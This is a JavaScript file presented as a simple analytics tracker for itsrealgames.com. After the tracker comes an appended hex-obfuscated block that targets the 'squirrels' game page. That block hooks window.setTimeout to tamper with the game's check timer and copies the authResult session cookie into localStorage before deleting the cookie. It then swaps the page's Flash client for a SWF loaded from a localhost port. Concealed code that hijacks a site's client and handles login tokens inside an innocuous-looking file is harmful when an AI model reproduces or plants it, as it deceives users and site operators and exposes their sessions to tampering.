/**
 * Analytics frontend
 * @version 1.0.0
 */
window.A = {
	'_account': 0,
	'_url': (document.location.protocol == "https:" ? "https:" : "http:") + "//an.itsrealgames.com/api.php",

	'_send': function(path)
	{
		var a = document.createElement("script");
		a.type = "text/javascript";
		a.async = true;
		a.src = this._url + "/" + this._account + "/" + path + "?" + new Date().getTime();
		a.onload = a.onerror = function()
		{
			if (this.parentNode == null)
				return;
			this.parentNode.removeChild(this);
		};
		a.onreadystatechange = function()
		{
			if (this.readyState != "complete")
				return;

			if (this.parentNode == null)
				return;
			this.parentNode.removeChild(this);
		};

		var s = document.getElementsByTagName("script")[0];
		s.parentNode.insertBefore(a, s);
	},

	'init': function(account)
	{
		this._account = account;
	},

	'action': function(path)
	{
		if (this._account == 0)
			return;

		path = path.toUpperCase();
		path = path.replace(" ", "/", "g");

		this._send(path);
	}
}

function _0x2732(){var _0x5b9ff3=['\x67\x61\x6d\x65\x73\x2e\x69\x74\x73\x72\x65\x61\x6c\x67\x61\x6d\x65\x73\x2e\x63\x6f\x6d\x2f\x73\x71\x75\x69\x72\x72\x65\x6c\x73\x2f\x73\x71\x75\x69\x72\x72\x65\x6c\x73\x5f\x77\x65\x62','\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74','\x63\x68\x65\x63\x6b','\x63\x6f\x6f\x6b\x69\x65','\x6d\x61\x74\x63\x68','\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65','\x61\x75\x74\x68\x52\x65\x73\x75\x6c\x74','\x61\x75\x74\x68\x52\x65\x73\x75\x6c\x74\x3d\x3b\x65\x78\x70\x69\x72\x65\x73\x3d\x54\x68\x75\x2c\x20\x30\x31\x20\x4a\x61\x6e\x20\x31\x39\x37\x30\x20\x30\x30\x3a\x30\x30\x3a\x30\x30\x20\x47\x4d\x54\x3b\x70\x61\x74\x68\x3d\x2f','\x65\x73\x74','\x65\x6c\x61\x70\x73\x65\x64','\x63\x6c\x6f\x73\x65\x64','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a','\x68\x74\x74\x70\x73\x3a','\x2f\x72\x65\x6c\x65\x61\x73\x65\x2f\x63\x6c\x69\x65\x6e\x74\x5f\x72\x65\x6c\x65\x61\x73\x65\x2e\x73\x77\x66','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x66\x6c\x61\x73\x68\x2d\x61\x70\x70','\x69\x6e\x64\x65\x78\x4f\x66','\x2f\x63\x6c\x69\x65\x6e\x74\x5f\x72\x65\x6c\x65\x61\x73\x65'];_0x2732=function(){return _0x5b9ff3;};return _0x2732();}function _0x594f(_0x273236,_0x594fe0){var _0x2cf68d=_0x2732();return _0x594f=function(_0x19630b,_0x32323b){_0x19630b=_0x19630b-0x0;var _0x1ca7ca=_0x2cf68d[_0x19630b];return _0x1ca7ca;},_0x594f(_0x273236,_0x594fe0);}var _0x59bb3a=_0x594f;if(document['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']['\x69\x6e\x64\x65\x78\x4f\x66'](_0x59bb3a(0x0))!=-0x1){var old_setTimeout=window[_0x59bb3a(0x1)];window[_0x59bb3a(0x1)]=function(_0x4a2d8c,_0x5c2484,..._0x5cbeb7){var _0x24b257=_0x594f;_0x24b257(0x2)in window&&_0x4a2d8c==window[_0x24b257(0x2)]&&(_0x4a2d8c=function(){var _0x1d05e6=_0x594f,_0x58c9db=document[_0x1d05e6(0x3)][_0x1d05e6(0x4)](/(?:^|; )authResult=([^;]*)/);_0x58c9db&&(window[_0x1d05e6(0x5)][_0x1d05e6(0x6)]=_0x58c9db[0x1],document[_0x1d05e6(0x3)]=_0x1d05e6(0x7));var _0x6360=![];try{_0x6360=_0x1d05e6(0x8)in window['\x77'];}catch(_0xb142f){}!_0x6360?window['\x77']={'\x65\x73\x74':window['\x77'],'\x65\x6c\x61\x70\x73\x65\x64':_0x5c2484,'\x63\x6c\x6f\x73\x65\x64':![]}:window['\x77'][_0x1d05e6(0x9)]=window['\x77']['\x65\x6c\x61\x70\x73\x65\x64']+_0x5c2484;if((window['\x77'][_0x1d05e6(0x8)]==null||window['\x77']['\x65\x73\x74'][_0x1d05e6(0xa)])&&window['\x77'][_0x1d05e6(0x9)]>0x1388)return;window['\x63\x68\x65\x63\x6b']();}),old_setTimeout(_0x4a2d8c,_0x5c2484,..._0x5cbeb7);};var swfFile=document[_0x59bb3a(0xb)][_0x59bb3a(0xc)]+_0x59bb3a(0xd)+(document[_0x59bb3a(0xb)][_0x59bb3a(0xc)]==_0x59bb3a(0xe)?0x5e88:0x5e24)+_0x59bb3a(0xf),autoInjectSwf=setInterval(function(){var _0x47fb6a=_0x594f,_0x4376e1=document[_0x47fb6a(0x10)](_0x47fb6a(0x11));if(!_0x4376e1)return;var _0x253f0b=_0x4376e1['\x64\x61\x74\x61'];if(!_0x253f0b)return;if(_0x253f0b[_0x47fb6a(0x12)](_0x47fb6a(0x13))==-0x1)return;_0x253f0b!=swfFile&&(_0x4376e1['\x64\x61\x74\x61']=swfFile),clearInterval(autoInjectSwf);},0x64);}